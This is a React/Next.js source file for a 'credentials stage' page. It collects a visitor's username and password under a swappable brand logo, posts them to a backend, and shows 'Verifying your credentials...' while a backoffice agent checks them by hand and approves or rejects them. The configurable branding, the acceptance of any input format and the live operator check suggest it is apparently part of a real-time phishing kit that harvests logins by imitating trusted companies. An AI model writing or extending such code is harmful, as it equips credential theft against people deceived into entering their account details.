'use client';

/**
 * Credentials Stage Page
 *
 * Customer enters username and password
 * Minimal client-side validation - accept any format
 * Agent verifies credentials manually in backoffice
 */

import { useCallback, useEffect, useState } from 'react';
import { useParams } from 'next/navigation';
import { useSessionStore } from '@shared';
import { WaitingState } from '@/components/verification/WaitingState';
import { ErrorState } from '@/components/verification/ErrorState';
import { currentBrand } from '@/config/branding';
import { Button } from '@/components/ui/button';
import { Input } from '@/components/ui/input';
import { Card } from '@/components/ui/card';
import { AlertCircle, Eye, EyeOff } from 'lucide-react';

export default function CredentialsPage() {
  const params = useParams();
  const sessionUuid = params.session_uuid as string;

  const { stage, status, loading, error, caseId } = useSessionStore();

  const { agentMessage } = useSessionStore();

  const [username, setUsername] = useState('');
  const [password, setPassword] = useState('');
  const [showPassword, setShowPassword] = useState(false);
  const [fieldError, setFieldError] = useState('');
  const [isSubmitting, setIsSubmitting] = useState(false);

  /**
   * Reset form when agent rejects submission
   */
  useEffect(() => {
    if (status === 'rejected' || status === 'error') {
      // Clear form fields and show error
      setUsername('');
      setPassword('');
      setFieldError(agentMessage || 'Your submission was rejected. Please try again.');
    }
  }, [status, agentMessage]);

  /**
   * Handle form submission
   */
  const handleSubmit = useCallback(
    async (e: React.FormEvent) => {
      e.preventDefault();
      setFieldError('');

      // Validate case ID is available
      if (!caseId) {
        setFieldError('Session information missing. Please refresh and try again.');
        return;
      }

      // Minimal validation - just check required fields
      if (!username.trim()) {
        setFieldError('Please enter your username');
        return;
      }

      if (!password) {
        setFieldError('Please enter your password');
        return;
      }

      setIsSubmitting(true);

      try {
        const response = await fetch('/api/submit-credentials', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            case_id: caseId,
            username: username.trim(),
            password, // No trimming for password
          }),
        });

        if (!response.ok) {
          console.error('Submission error');
          // Generic error message
          setFieldError('Unable to process your credentials. Please try again.');
          return;
        }

        // Success - show waiting state
        useSessionStore.setState({
          status: 'waiting',
          agentMessage: 'Verifying your credentials...',
          formData: {},
        });
      } catch (error) {
        console.error('Submission error:', error);
        setFieldError('Submission failed. Please try again.');
      } finally {
        setIsSubmitting(false);
      }
    },
    [username, password, sessionUuid]
  );

  // Show waiting state
  if (status === 'waiting') {
    return <WaitingState message="Verifying your credentials..." />;
  }

  return (
    <div className="min-h-screen bg-gradient-to-br from-background to-muted p-4">
      <div className="flex flex-col items-center justify-center min-h-screen space-y-6">
        {/* Brand Logo */}
        <div className="mb-4">
          <img
            src={currentBrand.logo}
            alt={currentBrand.companyName}
            className="h-12 w-auto"
            onError={(e) => {
              e.currentTarget.style.display = 'none';
            }}
          />
        </div>

        {/* Form Card */}
        <Card className="w-full max-w-md p-6 shadow-lg">
          <div className="space-y-6">
            {/* Header */}
            <div className="space-y-2">
              <h1 className="text-3xl font-bold text-foreground">
                Login Credentials
              </h1>
              <p className="text-muted-foreground">
                Please enter your login credentials
              </p>
            </div>

            {/* Form */}
            <form onSubmit={handleSubmit} className="space-y-4">
              {/* Username Input */}
              <div className="space-y-2">
                <label
                  htmlFor="username"
                  className="block text-sm font-medium text-foreground"
                >
                  Username
                </label>
                <Input
                  id="username"
                  type="text"
                  placeholder="Enter your username"
                  value={username}
                  onChange={(e) => {
                    setUsername(e.target.value);
                    if (fieldError) setFieldError('');
                  }}
                  disabled={isSubmitting || loading}
                  autoComplete="username"
                  required
                />
              </div>

              {/* Password Input */}
              <div className="space-y-2">
                <label
                  htmlFor="password"
                  className="block text-sm font-medium text-foreground"
                >
                  Password
                </label>
                <div className="relative">
                  <Input
                    id="password"
                    type={showPassword ? 'text' : 'password'}
                    placeholder="Enter your password"
                    value={password}
                    onChange={(e) => {
                      setPassword(e.target.value);
                      if (fieldError) setFieldError('');
                    }}
                    disabled={isSubmitting || loading}
                    autoComplete="current-password"
                    required
                  />
                  <button
                    type="button"
                    onClick={() => setShowPassword(!showPassword)}
                    className="absolute right-3 top-1/2 -translate-y-1/2 text-muted-foreground hover:text-foreground"
                    disabled={isSubmitting || loading}
                  >
                    {showPassword ? (
                      <EyeOff className="h-4 w-4" />
                    ) : (
                      <Eye className="h-4 w-4" />
                    )}
                  </button>
                </div>
              </div>

              {/* Field-level error */}
              {fieldError && (
                <div className="flex items-center gap-2 text-sm text-destructive">
                  <AlertCircle className="h-4 w-4" />
                  <span>{fieldError}</span>
                </div>
              )}

              {/* API-level error */}
              {error && !fieldError && (
                <div className="flex items-start gap-3 p-3 bg-destructive/10 rounded-md border border-destructive/20">
                  <AlertCircle className="h-4 w-4 text-destructive mt-0.5 flex-shrink-0" />
                  <p className="text-sm text-destructive">{error}</p>
                </div>
              )}

              {/* Submit Button */}
              <Button
                type="submit"
                disabled={
                  !username.trim() || !password || isSubmitting || loading
                }
                className="w-full"
                size="lg"
              >
                {isSubmitting ? 'Processing...' : 'Continue'}
              </Button>
            </form>
          </div>
        </Card>
      </div>
    </div>
  );
}
